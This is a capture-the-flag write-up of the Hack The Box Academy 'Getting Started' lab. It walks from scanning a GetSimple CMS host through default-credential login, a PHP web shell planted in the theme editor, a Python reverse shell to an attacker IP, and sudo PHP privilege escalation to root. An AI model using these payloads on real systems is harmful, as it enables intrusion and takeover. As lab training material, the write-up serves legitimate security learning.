# Knowledge Check  

[Getting Started - Knowledge Check](https://academy.hackthebox.com/module/77/section/859)  

## Service Scanning  

>The `-sC` parameter to specify that Nmap scripts should be used to try and obtain more detailed information. 
>The `-sV` parameter instructs Nmap to perform a version scan.
>In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures.
>Finally, `-p-` tells Nmap that we want to scan all 65,535 TCP ports.
>[Service Scanning](https://academy.hackthebox.com/module/77/section/726)  

```
sudo nmap -sCV -A -O 10.129.42.249
```  

>NMAP Output  

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
```  

## Web Enumeration  

>Open the target on port 80 site `http://10.129.42.249/` in Firefox browsers.  

![getting-started-web-enum](images/getting-started-web-enum.PNG)  

>Add the DNS host name to `/etc/hosts`.

```
sudo vi /etc/hosts
```  

>Check content of `Robots.txt` file on target web application.

```
curl http://gettingstarted.htb/robots.txt
```

>Output confirm path `/admin`.  

>Grab web banners.  

```
curl -IL http://gettingstarted.htb/admin/index.php
```  

```
whatweb http://gettingstarted.htb/admin/index.php
```  

>Test `/admin` web path discovered from nmap scan.
>On admin login portal test default credentials `admin:admin` as username and password.

>Identified the version of web application as `GetSimple CMS 3.3.15`.

## Public Exploits  

>Searching for working exploit.  
>[Finding Public Exploits](https://academy.hackthebox.com/module/77/section/843) doing online research and examining the target services identified.  

>Using `searchsploit` on kali.

```
searchsploit GetSimple CMS 3.3
```  

>Google Search `getsimple cms rce` for Remote Code Execution exploits in GetSimple CMS.  

[GetSimple CMS v3.3.16 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51475)  

### MetaSploit

>Search msfconsole for exploits.

```
sudo msfconsole
search getsimple cms

use exploit/unix/webapp/get_simple_cms_upload_exec
```

>Failed to gain working exploit with MSFConsole. 

## Shells  

>Web Application Edit Theme  
>Enumerating the target application finding the Edit Theme is php code.
>Replace the theme with PHP webshell - [Types of Shells](https://academy.hackthebox.com/module/77/section/725)  

```
<?php system($_REQUEST["cmd"]); ?>
```

>Insert above into the theme editor code.

![get-simple-theme-edit-rce](images/get-simple-theme-edit-rce.png)  

>Save the theme and go back to landing page to test webshell RCE.

![get-simple-webshell-rce](images/get-simple-webshell-rce.png)  

>Webshell commands to enumerate target.  

```
http://gettingstarted.htb/?cmd=whoami
http://gettingstarted.htb/?cmd=which+python3
```

### Python3 Reverse Shell  

>Identified Python3 on target, and setting up for reverse shell.
>Netcat on port 443.

```
rlwrap nc -nvlp 443
```

>Send webshell command through burp proxy, to encode the Python3 Reverse Shell code.  

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.140",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![burp-proxy-encode-python3-revshell](images/burp-proxy-encode-python3-revshell.png)  

>Located the user level flag, `cat /home/mrb3n/user.txt`  

## Privilege Escalation  

>Obtained low privilege access to the target as non root/admin user.  

>[PrivEsc Checklists](https://academy.hackthebox.com/module/77/section/844):  

1. Enumeration Scripts
2. Kernel Exploits
3. Vulnerable Software
4. User Privileges/Permissions
5. Scheduled Tasks
6. Exposed Credentials
7. SSH Keys  

>Enumeration of the local target and user Privileges or Permissions.  

```
sudo -l
```  

>Output from sudo check.

```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```  

>Look for ways to exploit it to get a shell as the root user, using the [GTFObins resources](https://gtfobins.github.io/)  

>Sudo Exploit with [PHP privileges](https://gtfobins.github.io/gtfobins/php/#sudo)

```
CMD="/usr/bin/bash"
sudo php -r "system('$CMD');"
```

>Root privilege access obtained.

>located the root user flag file, `cat /root/root.txt`

## Appendix  

>No file transfer to the target was required to exploit or obtained privileges.

>[Transferring Files](https://academy.hackthebox.com/module/77/section/849)



